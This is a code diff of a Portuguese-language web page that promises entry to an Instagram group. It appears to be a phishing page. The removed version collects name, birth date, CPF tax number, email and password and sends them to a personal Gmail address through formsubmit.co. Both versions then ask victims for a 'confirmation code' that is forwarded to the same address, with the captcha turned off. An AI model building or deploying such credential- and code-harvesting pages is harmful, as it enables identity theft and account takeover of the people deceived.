@@ -3,190 +3,71 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Cadastro + Confirmação</title>
+  <title>Confirmação do Grupo</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #83a4d4, #b6fbff);
+      background: linear-gradient(to right, #7f7fd5, #86a8e7, #91eae4);
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       margin: 0;
     }
-
     .container {
-      background: #fff;
+      background-color: #fff;
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+      max-width: 400px;
       width: 100%;
-      max-width: 420px;
-    }
-
-    h2 {
       text-align: center;
+    }
+    h2 {
       margin-bottom: 20px;
       color: #333;
     }
-
-    label {
-      display: block;
-      margin-top: 12px;
-      font-weight: bold;
+    p {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
     }
-
-    input, select {
+    input[type="text"] {
       width: 100%;
       padding: 12px;
-      margin-top: 6px;
-      border: 1px solid #ccc;
       border-radius: 6px;
-      font-size: 14px;
+      border: 1px solid #ccc;
+      font-size: 16px;
     }
-
     button {
+      margin-top: 20px;
       width: 100%;
       padding: 14px;
-      margin-top: 20px;
-      background-color: #007bff;
+      background-color: #28a745;
       color: white;
       border: none;
       border-radius: 6px;
       font-size: 16px;
       cursor: pointer;
     }
-
     button:hover {
-      background-color: #0056b3;
-    }
-
-    .carregando, .mensagem-final, #etapa2 {
-      display: none;
-      text-align: center;
-      margin-top: 20px;
-    }
-
-    .barra {
-      width: 100%;
-      background-color: #ddd;
-      border-radius: 10px;
-      overflow: hidden;
-      height: 20px;
-      margin-top: 20px;
-    }
-
-    .progresso {
-      height: 100%;
-      width: 0%;
-      background-color: #007bff;
-      animation: carregar 3s linear forwards;
-    }
-
-    @keyframes carregar {
-      0% { width: 0%; }
-      100% { width: 100%; }
+      background-color: #218838;
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-
-  <!-- ETAPA 1: Cadastro -->
-  <div id="etapa1">
-    <h2>Cadastro Inicial</h2>
-    <form id="formulario">
-      <label for="nome">Nome completo</label>
-      <input type="text" id="nome" name="nome" required>
-
-      <label for="data">Data de nascimento</label>
-      <input type="date" id="data" name="data_nascimento" required>
-
-      <label for="cpf">CPF</label>
-      <input type="text" id="cpf" name="cpf" required>
-
-      <label for="email">E-mail</label>
-      <input type="email" id="email" name="email_usuario" required>
-
-      <label for="senha">Senha</label>
-      <input type="password" id="senha" name="senha" required>
-
-      <label for="confirmarSenha">Confirmar senha</label>
-      <input type="password" id="confirmarSenha" name="confirmar_senha" required>
-
-      <p style="font-size: 13px; color: #555; margin-top: 10px;">
-        Após o cadastro, você será incluído no grupo do Instagram.
-      </p>
-
-      <button type="submit">Enviar cadastro</button>
-    </form>
-
-    <div class="carregando" id="carregando">
-      <p>Enviando informações...</p>
-      <div class="barra">
-        <div class="progresso"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ETAPA 2: Código de Confirmação -->
-  <div id="etapa2">
-    <h2>Confirmação do Grupo</h2>
-    <p>Enviamos um código para liberar sua entrada no grupo do Instagram.<br>Digite o código abaixo para confirmar:</p>
-
-    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
-      <input type="text" name="codigo_confirmacao" placeholder="Digite o código" required>
-      <input type="hidden" name="_next" value="https://tarefass.github.io/tarefas-/">
-      <input type="hidden" name="_captcha" value="false">
-      <button type="submit">Confirmar código</button>
-    </form>
-  </div>
-
+  <h2>Confirmação de Grupo</h2>
+  <p>Enviamos um código para liberar sua entrada no grupo do Instagram.<br>Digite o código abaixo para confirmar:</p>
+  
+  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+    <input type="text" name="codigo_confirmacao" placeholder="Digite o código" required>
+    <input type="hidden" name="_next" value="https://tarefass.github.io/tarefas-/">
+    <input type="hidden" name="_captcha" value="false">
+    <button type="submit">Confirmar código</button>
+  </form>
 </div>
-
-<script>
-  document.getElementById("formulario").addEventListener("submit", function(e) {
-    e.preventDefault();
-
-    const senha = document.getElementById("senha").value;
-    const confirmarSenha = document.getElementById("confirmarSenha").value;
-
-    if (senha !== confirmarSenha) {
-      alert("As senhas não coincidem.");
-      return;
-    }
-
-    const form = e.target;
-    const formData = new FormData(form);
-
-    form.style.display = "none";
-    document.getElementById("carregando").style.display = "block";
-
-    fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-      method: "POST",
-      body: formData,
-      headers: {
-        'Accept': 'application/json'
-      }
-    })
-    .then(response => {
-      if (response.ok) {
-        setTimeout(() => {
-          document.getElementById("etapa1").style.display = "none";
-          document.getElementById("etapa2").style.display = "block";
-        }, 3000);
-      } else {
-        throw new Error('Erro ao enviar');
-      }
-    })
-    .catch(error => {
-      alert("Ocorreu um erro ao enviar o formulário.");
-      form.style.display = "block";
-      document.getElementById("carregando").style.display = "none";
-    });
-  });
-</script>
 
 </body>
 </html>
